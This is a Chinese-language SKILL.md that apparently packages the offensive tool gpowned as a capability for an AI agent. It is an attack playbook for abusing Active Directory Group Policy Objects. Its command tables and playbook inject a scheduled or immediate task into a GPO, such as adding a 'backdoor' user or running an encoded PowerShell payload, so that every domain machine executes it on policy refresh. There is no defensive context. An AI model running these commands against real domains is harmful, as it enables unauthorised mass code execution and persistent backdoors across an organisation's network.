---
name: gpowned-gpo-abuse
description: gpowned: GPO 内下发恶意计划任务。信号:ad攻击,域渗透,认证+GPO 枚举,GPO 命令注入,计划任务方式下发。
---

# gpowned

- 攻击大类:C30 AD与横向移动
- 上游仓库:https://github.com/X-C3LL/gpowned
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install gpowned
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `gpowned auth -d corp.local -u svc -p pass` | 认证+GPO 枚举 |
| `gpowned abuse -d corp.local -u svc -p pass -gpo-name '{GPO}' -command 'net user backdoor Pass1 /add'` | GPO 命令注入 |
| `-scheduled-task` | 计划任务方式下发 |
| `-immediate-task` | 即时任务方式 |

## 攻击场景 Playbook

### GPO 内下发恶意计划任务

```bash
gpowned abuse -d corp.local -u svc -p pass -gpo-name '{ABCD-1234}' -scheduled-task -command 'powershell.exe -enc <b64>'
# 组策略刷新时域内机器执行
```

## 注意事项

GPO 滥用全链路: 枚举→在 GPO 中插入计划任务/即时任务→域内批量执行。
